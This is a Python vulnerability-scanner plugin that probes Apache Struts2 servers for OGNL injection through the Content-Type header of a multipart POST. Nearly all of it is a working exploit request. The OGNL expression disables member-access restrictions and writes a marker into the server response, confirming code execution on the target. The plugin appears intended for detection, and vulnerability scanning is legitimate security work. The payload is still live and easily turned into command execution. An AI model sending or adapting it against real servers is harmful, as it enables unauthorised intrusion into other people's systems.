#!/usr/bin/evn python
# -*-:coding:utf-8 -*-
import urlparse
import random


def assign(service, arg):
    if service == fingerprint.struts:
        return True, arg


def audit(arg):
    uri = urlparse.urlparse(arg).path
    randint1 = random.randint(1000, 10000)
    raw = """POST {uri} HTTP/1.1
Accept-Encoding: identity
Content-Length: 171
Content-Type: %{{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('{randomint1}'+602+53718)).(#o.close())}}
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36

--1c88e9afa73c438d93b5043a7096b207
Content-Disposition: form-data; name="image1"; filename="tmp.txt"
Content-Type: text/plain


--1c88e9afa73c438d93b5043a7096b207--
""".format(uri=uri, randomint1=str(randint1))

    code, head, html, redir, log = hackhttp.http(arg, raw=raw)
    if code == 200 and "%s60253718" % str(randint1) in html:
        security_hole("%s" % arg, log=log)

if __name__ == '__main__':
    from dummy import *
    audit(assign(fingerprint.struts, "http://127.0.0.1:8080/memoshow.action")[1])
